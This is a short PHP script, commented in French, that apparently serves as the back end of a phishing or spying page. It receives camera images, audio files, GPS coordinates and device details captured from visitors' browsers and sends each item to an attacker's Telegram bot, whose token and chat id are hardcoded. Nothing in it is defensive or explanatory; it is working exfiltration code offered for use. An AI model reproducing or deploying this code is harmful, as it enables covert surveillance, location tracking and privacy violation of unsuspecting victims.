<?php
// Configuration Telegram
$telegram_token = "8240454159:AAFpe6_z0Li9Z7eXfq_szqoCYo3f3Ab8p-Y";
$chat_id = "8426624764";

function sendToTelegram($message) {
    global $telegram_token, $chat_id;
    $url = "https://api.telegram.org/bot{$telegram_token}/sendMessage";
    $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML'];
    $options = ['http' => ['header' => "Content-Type: application/x-www-form-urlencoded\r\n", 'method' => 'POST', 'content' => http_build_query($data)]];
    file_get_contents($url, false, stream_context_create($options));
}

function sendImageToTelegram($image_data) {
    global $telegram_token, $chat_id;
    $url = "https://api.telegram.org/bot{$telegram_token}/sendPhoto";
    $post_fields = ['chat_id' => $chat_id, 'photo' => $image_data];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

function sendLocationToTelegram($lat, $lon) {
    global $telegram_token, $chat_id;
    $url = "https://api.telegram.org/bot{$telegram_token}/sendLocation";
    $data = ['chat_id' => $chat_id, 'latitude' => $lat, 'longitude' => $lon];
    $options = ['http' => ['header' => "Content-Type: application/x-www-form-urlencoded\r\n", 'method' => 'POST', 'content' => http_build_query($data)]];
    file_get_contents($url, false, stream_context_create($options));
}

// Vérifier le type de requête
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Recevoir les données de la caméra
    if (isset($_POST['cat'])) {
        $imageData = $_POST['cat'];
        $unencodedData = base64_decode($imageData);
        sendToTelegram("📷 <b>Nouvelle photo capturée !</b>");
        sendImageToTelegram($unencodedData);
    }
    
    // Recevoir les données audio
    if (isset($_FILES['audio_data'])) {
        sendToTelegram("🎤 <b>Nouvel enregistrement audio !</b>");
        sendToTelegram("Fichier audio reçu : " . $_FILES['audio_data']['name']);
    }
    
    // Recevoir les données JSON (géolocalisation, infos appareil)
    $input = file_get_contents('php://input');
    if ($input) {
        $data = json_decode($input, true);
        if (isset($data['lat']) && isset($data['lon'])) {
            sendToTelegram("📍 <b>Nouvelle position !</b>\nLat: {$data['lat']}\nLon: {$data['lon']}");
            sendLocationToTelegram($data['lat'], $data['lon']);
        }
        if (isset($data['userAgent'])) {
            sendToTelegram("🖥️ <b>Informations appareil</b>\n" . 
                          "OS: {$data['platform']}\n" .
                          "Navigateur: {$data['userAgent']}\n" .
                          "Résolution: {$data['screenWidth']}x{$data['screenHeight']}\n" .
                          "Langue: {$data['language']}\n" .
                          "Fuseau: {$data['timezone']}");
        }
    }
}

echo "OK";
?>
